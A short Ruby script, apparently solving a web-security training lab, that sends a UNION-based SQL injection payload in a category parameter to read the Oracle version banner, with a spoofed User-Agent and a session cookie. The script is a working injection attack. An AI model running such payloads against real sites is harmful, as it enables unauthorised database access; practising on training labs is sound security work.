require 'http'

payload = "' UNION SELECT banner,null FROM v$version-- -"

url = "https://0a1c0091042d26c9804712a100fc00b3.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "a3g3sFjXlOT4AH8Jd9tVGsTuxiNWuGox"
	)

resp = client.get url,:params => {:category => "Pets#{payload}"}

puts resp.body.to_s
